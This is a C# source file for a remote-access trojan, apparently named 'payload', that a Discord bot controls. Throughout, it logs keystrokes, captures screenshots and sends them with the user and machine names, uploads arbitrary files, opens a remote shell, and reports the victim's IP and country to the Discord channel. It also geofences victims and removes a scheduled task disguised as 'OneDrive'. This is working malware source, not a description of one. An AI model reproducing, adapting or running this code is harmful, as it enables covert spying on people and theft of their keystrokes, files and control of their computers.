﻿using System;
using System.Drawing;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System.Globalization;

namespace payload
{
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private static DiscordSocketClient client;
        private static string prefix;
        private static string keylog = string.Empty;
        private static bool logkeys = false;

        private static List<string> geolock = new List<string>();

        public static List<Shell> shells = new List<Shell>();

        static void Main(string[] args)
        {
            string token = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
            if (Uri.IsWellFormedUriString(token, UriKind.Absolute))
            {
                WebClient wc = new WebClient();
                token = Encoding.UTF8.GetString(Convert.FromBase64String(wc.DownloadString(token)));
                wc.Dispose();
            }
            prefix = args[1];
            if (args[2] != string.Empty) foreach (string item in args[2].Split(',')) geolock.Add(item.ToLower().Trim());

            if (Geocheck()) Uninfect();
            SetProcessDPIAware();
            try { Process.EnterDebugMode(); } catch { }
            new Thread(new ThreadStart(KeylogThread)).Start();

            client = new DiscordSocketClient();
            client.MessageReceived += MessageReceived;
            client.LoginAsync(TokenType.Bot, token).GetAwaiter().GetResult();
            client.StartAsync().GetAwaiter().GetResult();

            Thread.Sleep(-1);
        }

        private static bool Geocheck()
        {
            if (geolock.Count > 0)
            {
                WebClient wc = new WebClient();
                string country = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={wc.DownloadString("https://api.ipify.org/?format=txt")}"))["country_name"];
                wc.Dispose();

                if (!geolock.Contains(country.ToLower()) || !geolock.Contains(CultureInfo.CurrentCulture.EnglishName.ToLower())) return true;
                return false;
            }
            return false;
        }

        private static async Task MessageReceived(SocketMessage message)
        {
            if (message.Author.Id == client.CurrentUser.Id) return;
            if (message.Reference != null)
            {
                foreach (Shell s in shells)
                {
                    if (s.shmessage.Id == message.Reference.MessageId.Value)
                    {
                        s.SendCommand(message.Content);
                        await message.DeleteAsync();
                        return;
                    }
                }
            }
            if (!message.Content.StartsWith(prefix)) return;

            List<string> args = new List<string>(message.Content.Split(' '));
            string cmd = args[0].Remove(0, prefix.Length);
            args.RemoveAt(0);

            switch (cmd)
            {
                case "get":
                    {
                        Bitmap sc = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics sg = Graphics.FromImage(sc);
                        sg.CopyFromScreen(0, 0, 0, 0, sc.Size, CopyPixelOperation.SourceCopy);
                        sg.Dispose();

                        MemoryStream ms = new MemoryStream();
                        sc.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        sc.Dispose();

                        await message.Channel.SendFileAsync(ms, "unknown.png", $"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}");
                        ms.Dispose();
                        break;
                    }
                case "getfile":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        await message.Channel.SendFileAsync(args[1]);
                        break;
                    }
                case "shell":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                        shells.Add(s);
                        s.Start();
                        break;
                    }
                case "ipinfo":
                    {
                        WebClient wc = new WebClient();
                        string address = wc.DownloadString("https://api.ipify.org/?format=txt");
                        string location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
                        wc.Dispose();

                        await message.Channel.SendMessageAsync($"IP address: {address}\nLocation: {location}");
                        break;
                    }
                case "getkeylog":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(keylog));
                        await message.Channel.SendFileAsync(ms, "unknown.txt");
                        ms.Dispose();
                        keylog = string.Empty;
                        break;
                    }
                case "startkeylogger":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        logkeys = true;
                        await message.Channel.SendMessageAsync($"Keylogger started on {Environment.MachineName}");
                        break;
                    }
                case "stopkeylogger":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        logkeys = false;
                        await message.Channel.SendMessageAsync($"Keylogger stopped on {Environment.MachineName}");
                        break;
                    }
                case "uninfect":
                    {
                        if (args[0].Trim() != Environment.MachineName) break;
                        Uninfect();
                        break;
                    }
            }
        }

        private static void KeylogThread()
        {
            while (true)
            {
                if (logkeys)
                {
                    for (int i = 0; i < 255; i++)
                    {
                        int key = GetAsyncKeyState(i);
                        if (key == 1 || key == -32767)
                        {
                            keylog += (Keys)i + " ";
                        }
                    }
                }
                Thread.Sleep(1);
            }
        }

        private static void Uninfect()
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/delete /tn \"OneDrive\" /f",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            foreach (Process p in Process.GetProcessesByName("powershell")) p.Kill();
            Environment.Exit(1);
        }
    }
}